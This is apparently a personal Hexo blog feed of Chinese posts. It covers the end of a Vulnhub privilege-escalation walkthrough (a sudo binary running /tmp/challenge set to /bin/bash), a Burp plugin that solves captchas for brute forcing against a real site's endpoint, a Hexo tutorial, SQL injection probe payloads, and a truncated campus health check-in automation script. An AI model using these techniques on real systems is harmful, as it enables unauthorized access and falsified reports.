src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105165644625.png" alt="image-20221105165644625"></p><p>提示<code>/tmp/challenge</code> not found</p><h2 id="x2F-bin-x2F-bash提权"><a href="#x2F-bin-x2F-bash提权" class="headerlink" title="&#x2F;bin&#x2F;bash提权"></a>&#x2F;bin&#x2F;bash提权</h2><ul><li>接下来的思路就是创建<code>challenge</code>文件，将<code>/bin/bash</code>写入文件中，然后重新执行<code>sudo /home/victor/undefeated_victor</code>命令以<strong>获取root权限的shell</strong>.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; challenge</span><br><span class="line">chmod +x challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105170834360.png" alt="image-20221105170834360"></p><p>可以看到，此时已经&#x3D;&#x3D;成功拿到root权限&#x3D;&#x3D;</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><ul><li>切换到&#x2F;root,查看</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105171431456.png" alt="image-20221105171431456"></p><ul><li>查看<code>root.txt</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105171456711.png" alt="image-20221105171456711"></p><p>完结撒花~~~终于拿到了flag</p><h1 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h1><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><ul><li><p>使用nmap扫描的时候，用的是最简单的命令，扫描显示出来的信息比较单一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC ... &gt; xxx.txt</span><br></pre></td></tr></table></figure><p>导出到文件里，到时候找起来更方便，不要每次都在终端翻来翻去</p></li><li><p>对Kali内的工具不熟悉，到某个特定的步骤之后，知道要干啥，但不知道具体要怎么做，有什么工具可以使用。如果只下载了，又不去用它，那为什么要下载呢？单纯为了好看吗？</p><blockquote><p>后续花时间专门整理一下Kali的工具，输出一个文档</p></blockquote></li></ul><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>初次解除了完整的一套渗透测试流程，从查找IP到拿到Root权限，从Web打到shell再到提权</li><li>wordpress的主题模块可以执行命令</li><li>反弹shell初体验</li><li>更加熟悉linux的一些命令，比如<code>sudo -l</code>等</li><li>msf可用用background命令把meterpreter退到后台</li></ul><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><ul><li>最后AES解密：为什么是AES？那些参数是这么选的，问了大佬，说是密码学的知识！补！！！</li><li>写入<code>/bin/bash</code>提权，不懂！看！！！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp验证码爆破captcha-killer+ddddocr</title>
      <link href="/2022/burpsuite-captcha-killer-and-ddddocr/"/>
      <url>/2022/burpsuite-captcha-killer-and-ddddocr/</url>
      
        <content type="html"><![CDATA[<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/releases/">Releases · f0ng&#x2F;captcha-killer-modified</a></li></ul><p>​最新版的Burp插件（根据自己的jdk版本来选择）</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021704736.png" alt="image-20221102155830776" style="zoom:50%;" /><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/tree/0.16">f0ng&#x2F;captcha-killer-modified at 0.16</a></li></ul><p>​把<code>codereg.py</code>给down下来（你可以选择直接下zip包，或者直接复制）</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021704971.png" alt="image-20221102160044024" style="zoom:50%;" /><ul><li>安装ddddocr所需要的python库</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ddddocr aiohttp</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Burp安装插件</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021704397.png" alt="image-20221102160634476"></p><h1 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h1><h2 id="测试接口"><a href="#测试接口" class="headerlink" title="测试接口"></a>测试接口</h2><p>1、首先得找个验证码接口，不然咋测试？</p><p>​我这里随便上网找了个网站的<a href="http://passport.youmi.cn/include/showcaptcha/?w=62&h=24&s=12&x=0.7366157956335038&mobile=">验证码接口</a></p><p>​你可以自己找，也可以直接用我上面找的那个</p><p>2、访问上面的接口，bp抓包，发送到repeater模块（因为没有找到可以直接发到captcha-killer模块的选项）</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021705301.png" alt="image-20221102164204151" style="zoom:50%;" /><p>3、发送到captcha-killer</p><p>​选send to captcha panel哈！！</p><p>​下面的interface panel是识别模块用的（这里也就是ddddocr）</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021705424.png" alt="image-20221102164341238" style="zoom:50%;" /><p>4、点击【获取】，看后面的验证码也没有变化，有变化的话，测试接口这一部分就没问题啦</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021705259.png" alt="image-20221102164611408" style="zoom:50%;" /><p>接下来就开始配置ddddocr模块去识别</p><h2 id="ddddocr配置"><a href="#ddddocr配置" class="headerlink" title="ddddocr配置"></a>ddddocr配置</h2><p>刚刚下的<code>codereg.py</code>还记得么？pip包装好了就可以开始下面的步骤了。</p><p>1、用你的python3去运行它</p><p>​因为我电脑有两个版本的python，环境变量区分了python2和python3，你可以根据你自己电脑的配置来运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 codereg.py</span><br></pre></td></tr></table></figure><p>确定该服务已经起来了</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021705519.png" alt="image-20221102165131315"></p><p>2、配置interface</p><p>​我换了4130端口，你那边填多少端口以你上面跑python脚本的时候输出的端口</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021705686.png" alt="image-20221102165229831" style="zoom:50%;" /><p>request的内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:4130</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 55</span><br><span class="line"></span><br><span class="line">&lt;@BASE64&gt;&lt;@img_RAW&gt;&lt;@img_RAW&gt;&lt;@BASE64&gt;</span><br></pre></td></tr></table></figure><p>激动人心的时候到啦！</p><p>3、点【识别】</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021705281.png" alt="image-20221102165526579" style="zoom:50%;" /><p>欸~~这就可以啦</p><p>匹配方式选择Response data就好</p><p>如果返回 <strong>空白</strong>或者<strong>403Forbidden</strong>，参考以下方法</p><h1 id="返回空白"><a href="#返回空白" class="headerlink" title="返回空白"></a>返回空白</h1><p>接口的request填错了会这样，我遇到过，直接复制上面的模板就好</p><h1 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h1><p>打开<code>codereg.py</code></p><p>把下面这两句引起403报错的语句注释掉就好</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/202211021705894.png" alt="image-20221102165756410" style="zoom:50%;" /><p>接着Ctrl+C停止之前的脚本，重新运行一遍脚本，就可以啦</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo简明教程</title>
      <link href="/2022/hexo-tutorial/"/>
      <url>/2022/hexo-tutorial/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-Hexo？"><a href="#什么是-Hexo？" class="headerlink" title="什么是 Hexo？"></a>什么是 Hexo？</h1><p>Hexo 是一个基于 node.js 快速、简洁且高效的博客框架。支持 Markdown 写作，可一键部署到 <a href="https://github.com/">GitHub</a>平台。Hexo 还有丰富的主题和插件可供定制和扩展，可以瞬间拥有个人专属的博客网站。</p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><blockquote><p>本篇博客不提供安装教程（emmmm就是我太懒了），请自行搜索</p></blockquote><ul><li><p>node.js（不低于10.13，建议使用12.0及以上版本）</p><p>Hexo基于node.js</p></li><li><p>npm</p><p>node.js的包管理工具</p></li></ul><p>查看电脑是否安装了环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看node.js版本</span></span><br><span class="line">node <span class="literal">-v</span></span><br><span class="line"><span class="comment"># 查看npm版本</span></span><br><span class="line">npm <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p>有版本输出就代表环境安装好了</p><p>那我们就正式开始Hexo之路吧~</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="literal">-g</span> hexo<span class="literal">-cli</span></span><br></pre></td></tr></table></figure><p>-g 代表全局安装（不必太过纠结这个哈~熟悉前端和node的朋友可以直接<code>npm install hexo-cli</code>）</p><p>好啦！到这里，Hexo已经安装好啦 ~</p><h1 id="Hexo操作"><a href="#Hexo操作" class="headerlink" title="Hexo操作"></a>Hexo操作</h1><p>下面是Hexo的一些操作指南，助你快速入门Hexo</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>这里讲两种方式哈，效果都一样，随便选个就行</p><p><strong>方法一</strong></p><ol><li>新建一个文件夹</li><li>cmd切换到该路径，输入<code>hexo init</code></li></ol><p><strong>方法二</strong></p><p><code>hexo init [name]</code></p><p>name是文件夹名字，相当于省去了方法一的第一步</p><h2 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h2><p>经过上一步的初始化操作，你的Hexo博客已经搭建起来啦</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g <span class="comment"># 生成</span></span><br><span class="line">hexo s <span class="comment"># 本地启动服务</span></span><br></pre></td></tr></table></figure><p>这时候，终端会开启一个服务，一般是<a href="http://localhost:4000/">http://localhost:4000</a>，按住Ctrl单击就可以打开</p><p>这时候你就可以看到一个Hexo博客啦~</p><p><em>如果无法显示，可能是 4000 端口被占用了，可以使用如下命令指定端口</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s -p 4444 <span class="comment"># 指定4444端口或者其他端口</span></span><br></pre></td></tr></table></figure><p>如果经常4000端口被占用，建议一劳永逸，直接修改配置文件<em>node_modules&#x2F;hexo-server&#x2F;index.js</em>，将默认端口改成4444或者其他端口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">config</span>.<span class="property">server</span> = <span class="title function_">assign</span>(&#123;</span><br><span class="line">  <span class="comment">//将默认端口改成4444</span></span><br><span class="line">  <span class="attr">port</span>: <span class="number">4444</span>,</span><br><span class="line">  <span class="attr">log</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">ip</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">  <span class="attr">compress</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">header</span>: <span class="literal">true</span></span><br><span class="line">&#125;, hexo.<span class="property">config</span>.<span class="property">server</span>);</span><br></pre></td></tr></table></figure><p>如果你的github也配置好了，那么输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d <span class="comment"># 部署</span></span><br></pre></td></tr></table></figure><p>就可以把本地的博客部署到GitHub Pages上啦</p><h2 id="新建博客"><a href="#新建博客" class="headerlink" title="新建博客"></a>新建博客</h2><ol><li>新建一个文章</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br><span class="line"><span class="comment"># or 不使用简写</span></span><br><span class="line">hexo new <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br></pre></td></tr></table></figure><ol start="2"><li>打开博客目录下的&#x2F;source&#x2F;_posts就可以看到刚刚新建的md文件啦</li><li>编辑md文件，保存</li><li>生成并本地预览</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo s <span class="literal">-g</span> <span class="comment"># 组合命令，生成并本地预览</span></span><br><span class="line"><span class="comment"># or 分开输入两条命令</span></span><br><span class="line">hexo g<span class="comment"># 生成（缩写）</span></span><br><span class="line">hexo s<span class="comment"># 预览（缩写）</span></span><br><span class="line"><span class="comment"># or 分开并不使用简写</span></span><br><span class="line">hexo generate<span class="comment"># 生成</span></span><br><span class="line">hexo server <span class="comment"># 预览</span></span><br></pre></td></tr></table></figure><h2 id="设置标头"><a href="#设置标头" class="headerlink" title="设置标头"></a>设置标头</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">我是文章名</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-08-13 09:22:18</span></span><br><span class="line"><span class="comment"># 标签</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">blog</span></span><br><span class="line"><span class="comment"># 分类</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tutorial</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>在 _config.yml 开启资源文件夹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>开启之后，在 _posts 目录下会生成一个与文章同名的文件夹。把需要插入到文章中的图片放到该文件夹中，并在写文章时通过如下标签引用即可。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img &lt;图片名&gt; [图片标题] %&#125;</span><br></pre></td></tr></table></figure><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>默认主题太丑了？那换个好看滴主题叭~~</p><p>直接去官网看看，找到喜欢的换就行，一般主题的开发者会写好怎么更换的哈~（emmm是我懒）</p><p>换好了之后，执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean<span class="comment"># 清除，避免更换失败</span></span><br><span class="line">hexo s <span class="literal">-g</span><span class="comment"># 生成，本地预览</span></span><br><span class="line"><span class="comment">## 预览没问题之后</span></span><br><span class="line">hexo d<span class="comment"># 部署</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最简单的方法：判断SQL注入是字符型还是数字型</title>
      <link href="/2022/sqli-character-and-number-type-judgment/"/>
      <url>/2022/sqli-character-and-number-type-judgment/</url>
      
        <content type="html"><![CDATA[<p>在网上看了那些方法，总的来说，我觉得有些绕。今天练习sqli-libs的时候自己遇到了问题，自己琢磨琢磨就想到了这些方法。</p><p>废话不多说，下面开始吧！</p><h1 id="方法一：order-by法"><a href="#方法一：order-by法" class="headerlink" title="方法一：order by法"></a>方法一：order by法</h1><p>构造payload为：<code>id=1 order by 9999 --+</code></p><ul><li>如果正确返回页面，则为字符型</li><li>否则，为数字型</li></ul><blockquote><p>分析：<br>字符型执行的sql语句为 <code>select * from user where id=&#39;1 order by 9999 --+&#39;</code> ,注释符【- -】实际上在执行的时候，被当成id的一部分，也就是说，在执行sql语句的时候，条件是 <code>id=&#39;1 order by 9999 --+&#39;</code>。最终只会截取前面的数字，返回 id&#x3D;1 的结果。<br>如果是数字型的话，执行的sql语句为 <code>select * from user where id=1 order by 9999 --+</code> ,在现实生活中，根本就没什么可能会存在有9999个字段的表，所以会报错。</p></blockquote><h1 id="方法二：逻辑判断法"><a href="#方法二：逻辑判断法" class="headerlink" title="方法二：逻辑判断法"></a>方法二：逻辑判断法</h1><p>这就很简单了，就是猜，但是也得知道一点技巧。</p><p>比如说，id这种，一般在数据库存储为int类型的，在查询时，可能是数字型，也可能是字符型。</p><p>但是，如果是name或者username之类的，按正常逻辑，一看就知道是以varchar或者char存储的，那指定就是字符型了，因为不加引号，sql语句绝对报错。</p><p>就像这样：</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230704122423046.png" alt="image-20230704122423046" style="zoom:50%;" /><p>如果不加引号，就会报错：</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230704122440609.png" alt="image-20230704122440609" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>易校园自动打卡教程</title>
      <link href="/2021/yischool-auto-check-in/"/>
      <url>/2021/yischool-auto-check-in/</url>
      
        <content type="html"><![CDATA[<p>之前在CSDN发了一篇易校园的打卡教程，后面易校园进行了改版，原来的脚本失效了，但是学校又天天催打卡，于是就有了这篇。</p><p>本来也是在CSDN上发的，但是因为某些原因审核不通过，也是因此我才产生了搭建个人博客的想法。</p><blockquote><p>2022.11.16</p><p>脚本仍然有用，使用几个月下来，唯一的不爽是session隔一段时间就会更换导致打卡失败，每次都得重新抓包替换上去，有些麻烦。</p><p>等有时间再看看获取session的接口可不可以找到，然后集成到代码里，就可以实现全自动化的打卡了！</p></blockquote><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>软件版本（请自行百度下载）</p><ul><li><p>HttpCanary：v9.9.9.9安卓版<br>可以用burpsuite，findler等其他的Windows抓包软件代替，自行搜索如何用电脑抓手机的包。</p></li><li><p>易校园：v4.1.17（下最新版就好）<br>上篇教程的时候，最新版抓包不行，这次又可以了</p></li></ul><h1 id="http-Canary配置"><a href="#http-Canary配置" class="headerlink" title="http Canary配置"></a>http Canary配置</h1><p>一般一打开就会提示安装证书，跟着app的引导，安装就好了，要是没有弹出，可以参考我之前的博客<br><a href="https://blog.csdn.net/jenchoi413/article/details/124786250">python实现易校园自动打卡教程</a>（已经被CSDN删了）</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>1、完场上述准备工作 </p><p>2、进入易校园打卡界面，等待定位完成，划到底部【先不要提交】 </p><p>这样做是为了快速找到提交的包</p><p>3、此时打开HttpCanary，点击右下角的小飞机，开始抓包 </p><p>4、回到易校园，点击提交 </p><p>5、回到HttpCanary，再次点击右下角小飞机，停止抓包 </p><p>6、从下往上找出【POST <a href="https://h5.xiaofubao.com/marketing/health/doDetail%E3%80%91">https://h5.xiaofubao.com/marketing/health/doDetail】</a> </p><p>注意别找错了，一定是doDetail</p><p>7、找到之后点进去，点击请求包<br><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/a6f4985d333c4f51aafaf11f71204a7e.png" alt="img" style="zoom:67%;" /> </p><blockquote><p>嫌手动复制粘贴麻烦的话，推荐使用<strong>正则表达式</strong>把请求包转换成python字典的格式</p></blockquote><p>代码如下，修改填入你自己的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> yagmail</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendEmail</span>(<span class="params">email_to, email_title, email_content</span>):</span><br><span class="line">    <span class="comment"># 邮件用户</span></span><br><span class="line">    mail_user = <span class="string">&#x27;【你的QQ邮箱】&#x27;</span></span><br><span class="line">    <span class="comment"># 授权码</span></span><br><span class="line">    mail_key = <span class="string">&#x27;【授权码】&#x27;</span> <span class="comment"># 不会搞的自行百度qq邮箱授权码</span></span><br><span class="line">    <span class="comment"># smtp服务器</span></span><br><span class="line">    mail_host = <span class="string">&#x27;smtp.qq.com&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail_server = yagmail.SMTP(</span><br><span class="line">            user=mail_user, password=mail_key, host=mail_host)</span><br><span class="line">        mail_server.send(email_to, email_title,</span><br><span class="line">                         email_content, attachments=<span class="literal">None</span>)</span><br><span class="line">        mail_server.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面【raw】里的内容</span></span><br><span class="line">h = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;h5.xiaofubao.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;2051&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://h5.xiaofubao.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面【预览】里面的内容</span></span><br><span class="line">d = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;schoolCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;schoolName&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;identityType&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span 